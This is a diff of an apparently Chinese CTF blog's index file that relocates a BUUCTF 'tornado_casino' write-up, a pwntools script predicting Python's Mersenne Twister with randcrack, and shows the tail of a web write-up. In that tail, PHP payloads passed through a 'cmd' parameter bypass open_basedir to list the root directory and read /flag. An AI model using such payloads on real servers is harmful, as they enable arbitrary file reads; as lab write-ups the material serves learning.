@@ -53,10 +53,29 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>img%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">cmd=<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>img%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">chdir</span>(%<span class="number">27</span>..%<span class="number">27</span>);<span class="title function_ invoke__">ini_set</span>(%<span class="number">27</span>open_basedir%<span class="number">27</span>,%<span class="number">27</span>/%<span class="number">27</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>));</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>Web</category>
+        <category>WEB</category>
       </categories>
       <tags>
         <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buu刷题记录：[pasecactf_2019]tornado_casino</title>
+    <url>/2022/06/03/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A%5Bpasecactf_2019%5Dtornado_casino/</url>
+    <content><![CDATA[<p>首先打开py文件看一眼，输3退出，输2再输b33_1_4m_b3333会让某个自减的东西加一千，输1时会生成一个32位的随机数，并且将输入的随机数与其自己生成的随机数比较，相等则返回flag。</p>
+<p>那么题目的思路就很明确了：生成624个随机数并且使用randcrack库计算第625个随机数上传即可。</p>
+<span id="more"></span>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29318</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[3] - Exit\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Enter your promocode:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;b33_1_4m_b3333&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[3] - Exit\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">num = []</span><br><span class="line"></span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;[$] - $$$SPIN$$$\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;$&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;It will be:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1234&#x27;</span>)</span><br><span class="line">    data = sh.recvline()</span><br><span class="line">    data = <span class="built_in">str</span>(data)</span><br><span class="line">    data1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        data1 += data[<span class="number">4</span> + <span class="number">2</span> * j]</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(data1, <span class="number">16</span>))</span><br><span class="line">aa = rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[$] - $$$SPIN$$$\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;$&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;It will be:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">hex</span>(aa).encode())</span><br><span class="line">sh.recvlines(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>flag:　flag{b346a745-1b98-4908-8e2e-7b25d3d5a46f}</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Crypto</category>
+      </categories>
+      <tags>
+        <tag>mt19937</tag>
+        <tag>pwntools</tag>
       </tags>
   </entry>
   <entry>
@@ -236,25 +255,6 @@ B=(k_1k_2N,k_2(g+k_1s)M_1,g(k_1-k_2)M_2,(g+k_1s)(g+k_2s))\\
       </categories>
       <tags>
         <tag>数据库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buu刷题记录：[pasecactf_2019]tornado_casino</title>
-    <url>/2022/06/03/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A%5Bpasecactf_2019%5Dtornado_casino/</url>
-    <content><![CDATA[<p>首先打开py文件看一眼，输3退出，输2再输b33_1_4m_b3333会让某个自减的东西加一千，输1时会生成一个32位的随机数，并且将输入的随机数与其自己生成的随机数比较，相等则返回flag。</p>
-<p>那么题目的思路就很明确了：生成624个随机数并且使用randcrack库计算第625个随机数上传即可。</p>
-<span id="more"></span>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29318</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[3] - Exit\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Enter your promocode:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;b33_1_4m_b3333&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[3] - Exit\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">num = []</span><br><span class="line"></span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;[$] - $$$SPIN$$$\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;$&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;It will be:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;1234&#x27;</span>)</span><br><span class="line">    data = sh.recvline()</span><br><span class="line">    data = <span class="built_in">str</span>(data)</span><br><span class="line">    data1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        data1 += data[<span class="number">4</span> + <span class="number">2</span> * j]</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(data1, <span class="number">16</span>))</span><br><span class="line">aa = rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[$] - $$$SPIN$$$\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;$&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;It will be:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">hex</span>(aa).encode())</span><br><span class="line">sh.recvlines(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-<ul>
-<li>flag:　flag{b346a745-1b98-4908-8e2e-7b25d3d5a46f}</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Crypto</category>
-      </categories>
-      <tags>
-        <tag>mt19937</tag>
-        <tag>pwntools</tag>
       </tags>
   </entry>
   <entry>
